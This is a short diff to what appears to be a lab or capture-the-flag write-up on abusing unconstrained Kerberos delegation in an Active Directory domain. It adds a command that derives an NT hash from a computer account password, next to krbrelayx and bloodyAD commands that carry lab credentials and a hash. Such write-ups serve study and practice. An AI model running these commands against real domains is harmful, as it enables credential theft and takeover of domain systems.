@@ -1612,6 +1612,8 @@ python3 /opt/krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 
 
 bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'oxdf$' -f TRUSTED_FOR_DELEGATION
 
+echo -n <New Computer password> | iconv -t utf-16le | openssl md4 -provider legacy
+
 python3 /opt/krbrelayx/krbrelayx.py -hashes :02cb8258df07966e32677128e5ff1d26
 ```
 ```bash
